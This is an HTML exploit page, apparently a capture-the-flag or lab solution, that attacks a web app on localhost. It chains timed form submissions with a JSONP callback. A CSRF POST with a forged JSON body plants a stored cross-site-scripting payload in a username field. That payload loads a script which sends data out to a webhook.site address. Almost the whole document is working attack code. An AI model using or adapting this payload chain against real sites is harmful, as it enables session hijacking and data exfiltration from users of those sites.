<!DOCTYPE html>
<html>
<body>
  <form id="f1" target="worker" action="http://localhost:8000/#/sheets" method="GET"></form>

  <form id="f2" target="logout" action="http://localhost:8000/api/logout" method="GET"></form>

  <form id="f3" target="logout" action="http://localhost:8000/api/whoami"
        method="POST" enctype="text/plain">
    <input name='{"new_username":"<</textarea><iframe srcdoc=<script/src' value='http://localhost:5000/api/whoami/jsonp?callback=https://webhook.site/2dc905f2-89e6-493d-bc1b-1d51702524e0?k=hi></script></iframe>"}'>
  </form>

  <form id="f4" target="logout" action="http://localhost:8000/#/settings" method="GET"></form>

  <script>
    function exploit(data) {
        const workerWindow = window.open('', 'worker');
        const logoutWindow = window.open('', 'logout');

        setTimeout(() => {
            document.getElementById('f1').submit();
        }, 3000);
        setTimeout(() => {
            document.getElementById('f2').submit();
        }, 6000);
        setTimeout(() => {
            document.getElementById('f3').submit();
        }, 9000);
        setTimeout(() => {
            document.getElementById('f4').submit();
        }, 12000);
    }
</script>

<script src=http://localhost:8000/api/whoami/jsonp?callback=exploit></script>

</body>
</html>
